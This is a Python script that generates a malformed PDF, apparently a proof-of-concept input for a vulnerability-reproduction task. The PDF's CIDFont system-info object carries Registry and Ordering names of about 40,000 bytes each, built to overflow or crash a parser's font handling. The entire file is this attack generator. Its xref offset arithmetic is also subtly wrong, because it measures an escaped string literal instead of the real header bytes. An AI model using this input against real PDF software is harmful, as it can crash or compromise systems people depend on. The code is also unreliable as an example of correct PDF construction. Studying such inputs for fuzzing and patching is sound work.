class Solution:
    def solve(self, src_path: str) -> bytes:
        chunk_size = 127
        long_len = 39998  # Adjust to approximate total size around 80064 including overhead
        registry_content = b'A' * long_len
        ordering_content = b'A' * long_len

        def name_tokens(content: bytes) -> bytes:
            tokens = []
            for i in range(0, len(content), chunk_size):
                chunk = content[i:i + chunk_size]
                tokens.append(b'/' + chunk)
            return b' '.join(tokens)

        reg_name = name_tokens(registry_content)
        ord_name = name_tokens(ordering_content)

        # Build PDF body parts
        parts = []

        # Header
        parts.append(b'%PDF-1.7\n%\xC2\xBB\xEF\xBF\xBD\xEF\xBF\xBD\n')

        # Object 1: Catalog
        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n'
        parts.append(obj1)

        # Object 2: Pages
        obj2 = b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n'
        parts.append(obj2)

        # Object 3: Page
        obj3 = b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 3 3] /Resources << /Font << /F1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n'
        parts.append(obj3)

        # Object 4: Contents
        obj4 = b'4 0 obj\n<< /Length 2 >>\nstream\n \nendstream\nendobj\n'
        parts.append(obj4)

        # Object 5: Type0 Font
        obj5 = b'5 0 obj\n<< /Type /Font /Subtype /Type0 /BaseFont /Dummy-CID /DescendantFonts [6 0 R] /Encoding /Identity-H >>\nendobj\n'
        parts.append(obj5)

        # Object 6: CIDFont
        obj6 = b'6 0 obj\n<< /Type /Font /Subtype /CIDFontType0 /BaseFont /Dummy-CID /CIDSystemInfo 7 0 R /DW 1000 >>\nendobj\n'
        parts.append(obj6)

        # Up to here, compute offset for object 7
        body_so_far = b''.join(parts)
        offset_obj7 = len(body_so_far)

        # Object 7: CIDSystemInfo with long names
        obj7_start = f'7 0 obj\n<< /Registry {reg_name.decode("latin-1", "replace")} /Ordering {ord_name.decode("latin-1", "replace")} /Supplement 0 >>\nendobj\n'.encode('latin-1')
        obj7 = obj7_start

        # Full body
        body = body_so_far + obj7
        offset_startxref = len(body)

        # Xref section
        # Objects: 0 (free), 1-7
        xref_entries = [
            b'0000000000 65535 f \n',
            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n"):010d}'.encode() + b' 00000 n \n',
            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n") + len(obj1):010d}'.encode() + b' 00000 n \n',
            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n") + len(obj1) + len(obj2):010d}'.encode() + b' 00000 n \n',
            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n") + len(obj1) + len(obj2) + len(obj3):010d}'.encode() + b' 00000 n \n',
            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n") + len(obj1) + len(obj2) + len(obj3) + len(obj4):010d}'.encode() + b' 00000 n \n',
            f'{len(b"%PDF-1.7\\n%\\xC2\\xBB\\xEF\\xBF\\xBD\\xEF\\xBF\\xBD\\n") + len(obj1) + len(obj2) + len(obj3) + len(obj4) + len(obj5):010d}'.encode() + b' 00000 n \n',
            f'{offset_obj7:010d}'.encode() + b' 00000 n \n'
        ]
        xref = b'xref\n0 8\n' + b''.join(xref_entries)

        # Trailer
        trailer = b'trailer\n<< /Size 8 /Root 1 0 R /Prev 0 >>\nstartxref\n' + str(offset_startxref).encode() + b'\n%%EOF'

        # Full PDF
        pdf = body + xref + trailer
        return pdf